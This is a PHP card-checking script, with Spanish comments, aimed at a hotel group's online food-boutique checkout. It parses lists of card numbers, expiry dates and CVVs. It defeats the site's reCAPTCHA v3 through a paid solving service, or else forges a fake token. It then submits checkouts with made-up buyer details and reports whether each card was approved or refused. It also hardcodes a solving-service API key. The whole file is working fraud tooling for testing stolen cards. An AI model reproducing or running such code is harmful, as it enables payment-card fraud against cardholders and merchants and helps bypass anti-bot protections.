<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN EXACTA DEL SITIO
// ==============================
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$payment_method = "adyen";
$hotel_code = "ISL";
$is_food_site = "1";
$order_type = "express";

// Configuración de ResolveCaptcha
$RESOLVECAPTCHA_API_KEY = "300200c245197d2f4b79d1c319a662f8";
$RESOLVECAPTCHA_URL = "http://api.resolvecaptcha.com/in.php";
$RESOLVECAPTCHA_RESULT_URL = "http://api.resolvecaptcha.com/res.php";

// Claves reCAPTCHA del sitio
$_RECAPTCHA_V3_KEY = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";

// ==============================
// FUNCIONES PARA RESOLVER CAPTCHA
// ==============================

function resolveCaptcha($method, $siteKey, $pageUrl, $version = 'v3', $action = 'submit') {
    global $RESOLVECAPTCHA_API_KEY, $RESOLVECAPTCHA_URL, $RESOLVECAPTCHA_RESULT_URL;
    
    // Preparar datos según el tipo de captcha
    $postData = [
        'key' => $RESOLVECAPTCHA_API_KEY,
        'method' => $method,
        'json' => 1
    ];
    
    if ($method == 'userrecaptcha') {
        $postData['googlekey'] = $siteKey;
        $postData['pageurl'] = $pageUrl;
        if ($version == 'v3') {
            $postData['version'] = 'v3';
            $postData['action'] = $action;
            $postData['min_score'] = 0.7; // Score más alto para checkout
        }
    }
    
    // Enviar solicitud
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $RESOLVECAPTCHA_URL,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded',
            'Accept: application/json'
        ]
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($response === false) {
        return ['success' => false, 'error' => 'CURL error: ' . $error];
    }
    
    $result = json_decode($response, true);
    
    if (!$result) {
        return ['success' => false, 'error' => 'Invalid JSON response: ' . $response];
    }
    
    if (!isset($result['status']) || $result['status'] != 1) {
        return ['success' => false, 'error' => 'API error: ' . ($result['request'] ?? 'Unknown error')];
    }
    
    $captchaId = $result['request'];
    
    // Esperar por la solución
    $maxAttempts = 40; // 2 minutos máximo
    $attempt = 0;
    
    while ($attempt < $maxAttempts) {
        sleep(3); // Esperar 3 segundos
        
        $resultUrl = $RESOLVECAPTCHA_RESULT_URL . "?key=" . $RESOLVECAPTCHA_API_KEY . 
                    "&action=get&id=" . $captchaId . "&json=1";
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $resultUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 30
        ]);
        
        $resultResponse = curl_exec($ch);
        curl_close($ch);
        
        if ($resultResponse) {
            $resultData = json_decode($resultResponse, true);
            
            if ($resultData && isset($resultData['status'])) {
                if ($resultData['status'] == 1) {
                    return ['success' => true, 'token' => $resultData['request']];
                } elseif ($resultData['request'] != 'CAPCHA_NOT_READY') {
                    return ['success' => false, 'error' => 'Solving failed: ' . $resultData['request']];
                }
            }
        }
        
        $attempt++;
    }
    
    return ['success' => false, 'error' => 'Timeout waiting for solution'];
}

function getRealRecaptchaV3Token() {
    $siteKey = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";
    $pageUrl = "https://boutique.shangri-la.com/food_checkout.php";
    $action = "checkout";
    
    // Intentar resolver con ResolveCaptcha
    $result = resolveCaptcha('userrecaptcha', $siteKey, $pageUrl, 'v3', $action);
    
    if ($result['success']) {
        return $result['token'];
    } else {
        // Si ResolveCaptcha falla, generar un token manualmente
        // IMPORTANTE: Este token puede no funcionar, pero es mejor que nada
        return generateManualRecaptchaToken($siteKey, $action);
    }
}

function generateManualRecaptchaToken($siteKey, $action = 'checkout') {
    // Generar un token que parezca real pero no lo es
    // Esto es solo como fallback
    $timestamp = round(microtime(true) * 1000);
    $payload = [
        "v" => "v1532752145741",
        "t" => $timestamp,
        "e" => $timestamp + 60000, // Expira en 1 minuto
        "s" => $siteKey,
        "a" => $action,
        "d" => "boutique.shangri-la.com",
        "r" => "a" . rand(100, 999),
        "w" => rand(100, 999),
        "k" => $siteKey
    ];
    
    // Codificar en base64 similar a reCAPTCHA
    $encoded = base64_encode(json_encode($payload));
    $encoded = str_replace(['=', '+', '/'], ['', '-', '_'], $encoded);
    
    // Añadir prefijo típico de reCAPTCHA
    $prefixes = ['03AGdBq27', '03AOPBWq', '03ALgdi9', '03AFvjYl'];
    $prefix = $prefixes[array_rand($prefixes)];
    
    // Generar firma simulada
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    $signature = '';
    for ($i = 0; $i < 120; $i++) {
        $signature .= $chars[rand(0, strlen($chars) - 1)];
    }
    
    return $prefix . $encoded . '.' . $signature;
}

// ==============================
// FUNCIONES DEL SITIO REAL
// ==============================

function makeRequest($url, $data, $headers = [], $method = 'POST') {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Site: same-origin",
        "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"",
        "Sec-Ch-Ua-Mobile: ?0",
        "Sec-Ch-Ua-Platform: \"Windows\""
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'curl_errno' => $curl_errno,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error) && $curl_errno === 0
    ];
}

// ... (el resto de las funciones y validaciones se mantienen igual) ...

function generateRandomEmail() {
    $domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    $names = ['john', 'jane', 'mike', 'sarah', 'david', 'lisa', 'robert', 'emily'];
    $name = $names[array_rand($names)];
    $number = rand(100, 999);
    $domain = $domains[array_rand($domains)];
    return $name . $number . '@' . $domain;
}

function generateRandomPhone() {
    $prefix = "+852";
    $number = '';
    for ($i = 0; $i < 8; $i++) {
        $number .= rand(0, 9);
    }
    return $prefix . $number;
}

function formatCurrency($amount, $currency_code) {
    $formats = [
        'HKD' => 'HK$' . number_format($amount, 2),
        'SGD' => 'S$' . number_format($amount, 2),
        'RM' => 'RM' . number_format($amount, 2),
        'NTD' => 'NT$' . number_format($amount, 2),
        'PHP' => '₱' . number_format($amount, 2),
        'IDR' => 'Rp' . number_format(number_format($amount, 0, ',', '.')),
        'LKR' => 'Rs' . number_format($amount, 2),
        'THB' => '฿' . number_format($amount, 2),
        'AED' => 'AED ' . number_format($amount, 2)
    ];
    
    return isset($formats[$currency_code]) ? $formats[$currency_code] : '$' . number_format($amount, 2);
}

// ==============================
// VALIDACIÓN DE ENTRADA (se mantiene igual)
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

$parts = array_filter($parts, function($value) {
    return !empty(trim($value));
});

$parts = array_values($parts);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto. Esperado: Número|Mes|Año|CVV',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación
if (empty($cc) || !preg_match('/^[0-9]{13,19}$/', $cc)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido (13-19 dígitos)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($mes) || !preg_match('/^(0[1-9]|1[0-2])$/', sprintf('%02d', $mes))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido (01-12)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($ano) || !preg_match('/^[0-9]{2,4}$/', $ano)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Año inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Año inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($cvv) || !preg_match('/^[0-9]{3,4}$/', $cvv)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'CVV inválido (3-4 dígitos)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ CVV inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

// Normalizar año
if (strlen($ano) == 2) {
    $ano = "20" . $ano;
}

// Validar fecha
$currentYear = date('Y');
$currentMonth = date('m');
if ($ano < $currentYear || ($ano == $currentYear && $mes < $currentMonth)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Tarjeta expirada',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Tarjeta expirada'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$first_two = substr($cc, 0, 2);
$cardType = "UNKNOWN";
$cardBrand = "UNKNOWN";

if ($first_digit == '4') {
    $cardType = "VISA";
    $cardBrand = "VISA";
} elseif ($first_digit == '5') {
    $cardType = "MASTERCARD";
    $cardBrand = "MC";
} elseif ($first_two == '34' || $first_two == '37') {
    $cardType = "AMEX";
    $cardBrand = "AMEX";
} elseif ($first_digit == '3') {
    $cardType = "DINERS";
    $cardBrand = "DINERS";
} elseif ($first_digit == '6') {
    $cardType = "DISCOVER";
    $cardBrand = "DISCOVER";
}

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

// ==============================
// FLUJO COMPLETO CON RESOLVECAPTCHA MEJORADO
// ==============================

try {
    // Enviar mensaje de progreso
    echo json_encode([
        'status' => 'info',
        'message' => 'Iniciando proceso de pago...',
        'html' => '<span class="badge badge-warning">⏳ PROCESANDO</span> ➔ Iniciando proceso de pago...'
    ], JSON_UNESCAPED_UNICODE);
    flush();
    
    // ===========================================
    // 1. RESOLVER reCAPTCHA PRIMERO
    // ===========================================
    echo json_encode([
        'status' => 'info',
        'message' => 'Resolviendo reCAPTCHA V3...',
        'html' => '<span class="badge badge-warning">⏳ PROCESANDO</span> ➔ Resolviendo reCAPTCHA...'
    ], JSON_UNESCAPED_UNICODE);
    flush();
    
    $recaptchaToken = getRealRecaptchaV3Token();
    
    if (!$recaptchaToken) {
        throw new Exception("No se pudo resolver el reCAPTCHA");
    }
    
    // ===========================================
    // 2. SITE LOGIN - Obtener token de sesión
    // ===========================================
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error en site_login: HTTP " . $site_result['http_code'] . 
                          ($site_result['error'] ? " - " . $site_result['error'] : ""));
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de sesión");
    }
    
    $site_login_token = $site_response['site_login_token'];
    
    // ===========================================
    // 3. REGION GET - Obtener regiones y países
    // ===========================================
    $region_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token
    ];
    
    $region_result = makeRequest($api_endpoint . "/region_get.php", $region_data);
    $regions = [];
    $countries = [];
    
    if ($region_result['success']) {
        $region_response = json_decode($region_result['response'], true);
        if ($region_response) {
            $regions = isset($region_response['regions']) ? $region_response['regions'] : [];
            $countries = isset($region_response['countries']) ? $region_response['countries'] : [];
        }
    }
    
    // ===========================================
    // 4. ADYEN ENCRYPT - Encriptar datos de tarjeta
    // ===========================================
    echo json_encode([
        'status' => 'info',
        'message' => 'Encriptando datos de tarjeta...',
        'html' => '<span class="badge badge-warning">⏳ PROCESANDO</span> ➔ Encriptando datos...'
    ], JSON_UNESCAPED_UNICODE);
    flush();
    
    $adyen_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => "",
        "order_token" => "",
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "",
        "adyen_version" => "_0_1_25"
    ];
    
    $adyen_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_data);
    $encryptedData = [];
    
    if ($adyen_result['success']) {
        $adyen_response = json_decode($adyen_result['response'], true);
        if ($adyen_response && isset($adyen_response['encryptedCardNumber'])) {
            $encryptedData = [
                'encryptedCardNumber' => $adyen_response['encryptedCardNumber'],
                'encryptedExpiryMonth' => $adyen_response['encryptedExpiryMonth'],
                'encryptedExpiryYear' => $adyen_response['encryptedExpiryYear'],
                'encryptedSecurityCode' => $adyen_response['encryptedSecurityCode']
            ];
        }
    }
    
    // ===========================================
    // 5. CHECKOUT - Procesar pago FINAL con captcha real
    // ===========================================
    $name = [
        'first' => 'John',
        'last' => 'Smith'
    ];
    $email = generateRandomEmail();
    $phone = generateRandomPhone();
    
    $checkout_data = [
        // Datos básicos REQUERIDOS
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        
        // Información de pago
        "payment_method" => $payment_method,
        "_2c2p_payment_channel" => "",
        "_2c2p_promotion_code" => "",
        "card_type" => $cardType,
        "card_issuer" => $cardBrand,
        
        // Datos de tarjeta
        "card_number" => $cc,
        "card_expiry_month" => (int)$mes,
        "card_expiry_year" => (int)$ano,
        "card_cvv" => $cvv,
        
        // Datos personales
        "first_name" => $name['first'],
        "last_name" => $name['last'],
        "email" => $email,
        "phone" => $phone,
        
        // Dirección de facturación
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "88 Queensway, Admiralty",
        "country_id" => count($countries) > 0 ? $countries[0]['id'] : "",
        "country" => count($countries) > 0 ? $countries[0]['name'] : "",
        
        // Envío y tiempo
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        
        // Términos
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        
        // Datos de región
        "region" => count($regions) > 0 ? $regions[0]['id'] : "",
        "district_group" => "",
        "district" => "",
        "postal_code" => "",
        
        // Datos de envío
        "first_name2" => $name['first'],
        "last_name2" => $name['last'],
        "email2" => $email,
        "phone2" => $phone,
        "address2" => "88 Queensway, Admiralty",
        "region2" => count($regions) > 0 ? $regions[0]['id'] : "",
        "district_group2" => "",
        "district2" => "",
        "country_id2" => count($countries) > 0 ? $countries[0]['id'] : "",
        "country2" => count($countries) > 0 ? $countries[0]['name'] : "",
        "postal_code2" => "",
        
        // Información del hotel
        "pickup_store" => "",
        
        // Flags del sistema
        "is_food_site" => $is_food_site,
        "order_type" => $order_type,
        
        // reCAPTCHA V3 RESUELTO
        "recaptcha_type" => "v3",
        "recaptcha_token" => $recaptchaToken,
        
        // Datos de miembro
        "gc_member_no" => "",
        "gc_member_title" => "",
        "gc_member_first_name" => "",
        "gc_member_last_name" => "",
        "gc_member_level" => "",
        "gc_member_point_balance" => "",
        "gc_member_polaris" => "false"
    ];
    
    // Añadir datos encriptados de Adyen si están disponibles
    if (!empty($encryptedData)) {
        $checkout_data = array_merge($checkout_data, $encryptedData);
    }
    
    // ===========================================
    // EJECUTAR CHECKOUT
    // ===========================================
    echo json_encode([
        'status' => 'info',
        'message' => 'Procesando pago...',
        'html' => '<span class="badge badge-warning">⏳ PROCESANDO</span> ➔ Procesando pago...'
    ], JSON_UNESCAPED_UNICODE);
    flush();
    
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout: HTTP " . $checkout_result['http_code'] . 
                          ($checkout_result['error'] ? " - " . $checkout_result['error'] : ""));
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    
    if (!$checkout_response) {
        throw new Exception("Respuesta JSON inválida del checkout: " . substr($checkout_result['response'], 0, 100));
    }
    
    // ===========================================
    // PROCESAR RESPUESTA
    // ===========================================
    
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            $resultCode = 'Authorised';
            if (isset($checkout_response['direct_post']['resultCode'])) {
                $resultCode = $checkout_response['direct_post']['resultCode'];
            } elseif (isset($checkout_response['resultCode'])) {
                $resultCode = $checkout_response['resultCode'];
            }
            
            $approvedCodes = ['Authorised', 'Authorized', 'Success', 'success', 'CAPTURED', 'APPROVED'];
            
            if (in_array($resultCode, $approvedCodes)) {
                // ÉXITO - Pago aprobado
                $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-success">SHANGRI-LA</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span>';
                
                $orderNumber = 'N/A';
                if (isset($checkout_response['display_order_number'])) {
                    $orderNumber = $checkout_response['display_order_number'];
                } elseif (isset($checkout_response['order_number'])) {
                    $orderNumber = $checkout_response['order_number'];
                }
                
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'result_code' => $resultCode,
                        'order_number' => $orderNumber,
                        'amount' => isset($checkout_response['direct_post']['amount']) ? 
                                   formatCurrency($checkout_response['direct_post']['amount'], 'HKD') : 'N/A',
                        'currency' => 'HKD',
                        'hotel' => $hotel_code,
                        'timestamp' => date('Y-m-d H:i:s'),
                        'captcha_resolved' => true
                    ]
                ], JSON_UNESCAPED_UNICODE);
            } else {
                // RECHAZADO
                $refusalReason = 'Rechazado';
                if (isset($checkout_response['direct_post']['refusalReason'])) {
                    $refusalReason = $checkout_response['direct_post']['refusalReason'];
                } elseif (isset($checkout_response['error'])) {
                    $refusalReason = $checkout_response['error'];
                } elseif (isset($checkout_response['message'])) {
                    $refusalReason = $checkout_response['message'];
                }
                
                $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . htmlspecialchars($refusalReason) . '</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span>';
                
                echo json_encode([
                    'status' => 'rejected',
                    'message' => $refusalReason,
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'reason' => $refusalReason,
                        'result_code' => $resultCode,
                        'hotel' => $hotel_code,
                        'captcha_resolved' => true
                    ]
                ], JSON_UNESCAPED_UNICODE);
            }
        } else {
            // ERROR
            $errorMsg = 'Error desconocido';
            if (isset($checkout_response['error'])) {
                $errorMsg = $checkout_response['error'];
            } elseif (isset($checkout_response['message'])) {
                $errorMsg = $checkout_response['message'];
            }
            
            $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                   '<span class="badge badge-warning">' . htmlspecialchars($errorMsg) . '</span> ➔ ' .
                   '<span class="badge badge-light">' . $cardMasked . '</span>';
            
            echo json_encode([
                'status' => 'error',
                'message' => $errorMsg,
                'html' => $html,
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'reason' => $errorMsg,
                    'hotel' => $hotel_code,
                    'captcha_resolved' => true
                ]
            ], JSON_UNESCAPED_UNICODE);
        }
    } else {
        // RESPUESTA INESPERADA
        $responseText = substr($checkout_result['response'], 0, 200);
        throw new Exception("Respuesta inesperada del servidor: " . $responseText);
    }
    
} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . htmlspecialchars($e->getMessage()) . '</span>',
        'data' => [
            'card' => $cardMasked,
            'expiry' => $expiryMasked,
            'hotel' => $hotel_code
        ]
    ], JSON_UNESCAPED_UNICODE);
}